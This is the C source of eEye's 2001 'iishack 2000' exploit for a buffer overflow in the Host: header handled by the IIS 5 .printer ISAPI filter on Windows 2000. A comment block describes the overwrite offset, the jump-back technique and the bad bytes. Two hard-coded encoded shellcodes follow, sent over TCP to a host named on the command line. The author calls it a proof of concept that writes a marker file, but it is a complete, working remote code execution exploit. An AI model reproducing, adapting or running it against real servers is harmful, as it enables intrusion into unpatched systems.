/***********************************************************************
iishack 2000 - eEye Digital Security - 2001
This affects all unpatched windows 2000 machines with the .printer
isapi filter loaded.  This is purely proof of concept.

Quick rundown of the exploit:
	
Eip overruns at position 260
i have 19 bytes of code to jump back to the beginning of the buffer.
(and a 4 byte eip jumping into a jmp esp located in mfc42.dll).  The 
jumpback was kinda weird, requiring a little forward padding to protect 
the rest of the code.
	
The buffer itself:
Uou only have about 250ish bytes before the overflow(taking into 
account the eip and jumpback), and like 211 after it.  this makes
things tight.  This is why i hardcoded the offsets and had 2 shellcodes,
one for each revision.  normally, this would suck, but since iis is kind
to us, it cleanly restarts itself if we blow it, giving us another chance.

This should compile clean on windows, linux and *bsd.  Other than that, you 
are on your own, but the vector is a simple tcp vector, so no biggie.

The vector:

the overflow happens in the isapi handling the .printer extension.  The actual
overflow is in the Host: header.  This buffer is a bit weird, soi be carfull 
what you pass into it.  It has a minimal amount of parsing happening before 
we get it, making some chars not able to be used(or forcing you to encode 
your payload).  As far as i can tell, the bad bytes i've come across are:

0x00(duh)
0x0a(this inits a return, basically flaking our buffer)
0x0d(same as above)
0x3a(colon: - this seems to be a separator of some kind, didn't have time or 
	energy to reverse it any further,  it breaks stuff, keep it out of 
	your buffer)
	
i have a feeling that there are more bad chars, but in the shellcode i've written
(both this proof of concept and actual port binding shellcode),  i've come across
problems, but haven't specifically tagged a "bad" char.


One more thing...  inititally, i got this shellcode to fit on the left side of 
the buffer overflow.  something strange was causing it to fail if i had a length 
of under about 315 chars.  This seems strange to me, but it could be soemthing i 
just screwed up writing this code.  This explains the 0x03s padding the end of the
shellcode.
	
Ryan Permeh
ryan@eeye.com

greetz: riley, for finding the hole
	marc, for being a cool boss
	dale,nicula,firas, for being pimps
	greg hoglund, for sparking some really interesting ideas on exploitable buffers
	dark spyrit, for beginning the iis hack tradition
	I would also like to thank the academy and to all of those who voted....
	http://www.eeye.com/html/research/Advisories/tequila.jpg
*************************************************************************/




#ifdef _WIN32
#include <Winsock2.h>
#include <Windows.h>
#define snprintf _snprintf
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#endif
#include <stdio.h>

void usage();
unsigned char GetXORValue(char *szBuff, unsigned long filesize);


unsigned char sc[2][315]={	"\x8b\xc4\x83\xc0\x11\x33\xc9\x66\xb9\x20\x01\x80\x30\x03\x40\xe2\xfa\xeb\x03\x03\x03\x03\x5c\x88\xe8\x82\xef\x8f\x09\x03\x03\x44\x80\x3c\xfc\x76\xf9\x80\xc4\x07\x88\xf6\x30\xca\x83\xc2\x07\x88\x04\x8a\x05\x80\xc5\x07\x80\xc4\x07\xe1\xf7\x30\xc3\x8a\x3d\x80\xc5\x07\x80\xc4\x17\x8a\x3d\x80\xc5\x07\x30\xc3\x82\xc4\xfc\x03\x03\x03\x53\x6b\x83\x03\x03\x03\x69\x01\x53\x53\x6b\x03\x03\x03\x43\xfc\x76\x13\xfc\x56\x07\x88\xdb\x30\xc3\x53\x54\x69\x48\xfc\x76\x17\x50\xfc\x56\x0f\x50\xfc\x56\x03\x53\xfc\x56\x0b\xfc\xfc\xfc\xfc\xcb\xa5\xeb\x74\x8e\x28\xea\x74\xb8\xb3\xeb\x74\x27\x49\xea\x74\x60\x39\x5f\x74\x74\x74\x2d\x66\x46\x7a\x66\x2d\x60\x6c\x6e\x2d\x77\x7b\x77\x03\x6a\x6a\x70\x6b\x62\x60\x68\x31\x68\x23\x2e\x23\x66\x46\x7a\x66\x23\x47\x6a\x64\x77\x6a\x62\x6f\x23\x50\x66\x60\x76\x71\x6a\x77\x7a\x0e\x09\x23\x45\x6c\x71\x23\x67\x66\x77\x62\x6a\x6f\x70\x23\x75\x6a\x70\x6a\x77\x39\x23\x4b\x77\x77\x73\x39\x2c\x2c\x74\x74\x74\x2d\x66\x46\x7a\x66\x2d\x60\x6c\x6e\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x90\x90\x90\x90\x90\x90\x90\x90\xcb\x4a\x42\x6c\x90\x90\x90\x90\x66\x81\xec\x14\x01\xff\xe4\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x00", 
				"\x8b\xc4\x83\xc0\x11\x33\xc9\x66\xb9\x20\x01\x80\x30\x03\x40\xe2\xfa\xeb\x03\x03\x03\x03\x5c\x88\xe8\x82\xef\x8f\x09\x03\x03\x44\x80\x3c\xfc\x76\xf9\x80\xc4\x07\x88\xf6\x30\xca\x83\xc2\x07\x88\x04\x8a\x05\x80\xc5\x07\x80\xc4\x07\xe1\xf7\x30\xc3\x8a\x3d\x80\xc5\x07\x80\xc4\x17\x8a\x3d\x80\xc5\x07\x30\xc3\x82\xc4\xfc\x03\x03\x03\x53\x6b\x83\x03\x03\x03\x69\x01\x53\x53\x6b\x03\x03\x03\x43\xfc\x76\x13\xfc\x56\x07\x88\xdb\x30\xc3\x53\x54\x69\x48\xfc\x76\x17\x50\xfc\x56\x0f\x50\xfc\x56\x03\x53\xfc\x56\x0b\xfc\xfc\xfc\xfc\x50\x33\xeb\x74\xf7\x86\xeb\x74\x2e\xf0\xeb\x74\x4c\x30\xeb\x74\x60\x39\x5f\x74\x74\x74\x2d\x66\x46\x7a\x66\x2d\x60\x6c\x6e\x2d\x77\x7b\x77\x03\x6a\x6a\x70\x6b\x62\x60\x68\x31\x68\x23\x2e\x23\x66\x46\x7a\x66\x23\x47\x6a\x64\x77\x6a\x62\x6f\x23\x50\x66\x60\x76\x71\x6a\x77\x7a\x0e\x09\x23\x45\x6c\x71\x23\x67\x66\x77\x62\x6a\x6f\x70\x23\x75\x6a\x70\x6a\x77\x39\x23\x4b\x77\x77\x73\x39\x2c\x2c\x74\x74\x74\x2d\x66\x46\x7a\x66\x2d\x60\x6c\x6e\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x90\x90\x90\x90\x90\x90\x90\x90\xcb\x4a\x42\x6c\x90\x90\x90\x90\x66\x81\xec\x14\x01\xff\xe4\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x00"};

main (int argc, char *argv[])
{
	char request_message[500];
	int X,sock,sp=0;
	unsigned short serverport=htons(80);
	struct hostent *nametocheck;
	struct sockaddr_in serv_addr;
	struct in_addr attack;
#ifdef _WIN32
	WORD werd;
	WSADATA wsd;
	werd= MAKEWORD(2,0);
	WSAStartup(werd,&wsd);
#endif
	printf("iishack2000 - Remote .printer overflow in 2k sp0 and sp1\n");
	printf("Vulnerability found by Riley Hassell <riley@eeye.com>\n");
	printf("Exploit by Ryan Permeh <ryan@eeye.com>\n");
	if(argc < 4) usage();
	if(argv[1] != NULL)
	{
		nametocheck = gethostbyname (argv[1]);
		memcpy(&attack.s_addr,nametocheck->h_addr_list[0],4);
	}
	else usage();	
	if(argv[2] != NULL)
	{
		serverport=ntohs((unsigned short)atoi(argv[2]));
	}	
	if(argv[3] != NULL)
	{
		sp=atoi(argv[3]);
	}	
	printf("Sending string to overflow sp %d for host: %s on port:%d\n",sp,inet_ntoa(attack),htons(serverport));
	memset(request_message,0x00,500);
	snprintf(request_message,500,"GET /null.printer HTTP/1.1\r\nHost: %s\r\n\r\n",sc[sp]);
	sock = socket (AF_INET, SOCK_STREAM, 0);
	memset (&serv_addr, 0, sizeof (serv_addr));
	serv_addr.sin_family=AF_INET;
	serv_addr.sin_addr.s_addr = attack.s_addr;
	serv_addr.sin_port = serverport;
	X=connect (sock, (struct sockaddr *) &serv_addr, sizeof (serv_addr));
	if(X==0)
	{
		send(sock,request_message,strlen(request_message)*sizeof(char),0);
		printf("Sent overflow, now look on the c: drive of %s for www.eEye.com.txt\n",inet_ntoa(attack));
		printf("If the file doesn't exist, the server may be patched,\nor may be a different service pack (try again with %d as the service pack)\n",sp==0?1:0);		
	}
	else
	{
		printf("Couldn't connect\n",inet_ntoa(attack));
	}
#ifdef _WIN32
	closesocket(sock); 
#else
	close(sock);
#endif
	return 0;
}
void usage()
{
	printf("Syntax:	 iishack2000 <hostname> <server port> <service pack>\n");
	printf("Example: iishack2000 127.0.0.1 80 0\n");
	printf("Example: iishack2000 127.0.0.1 80 1\n");	
	exit(1);
}
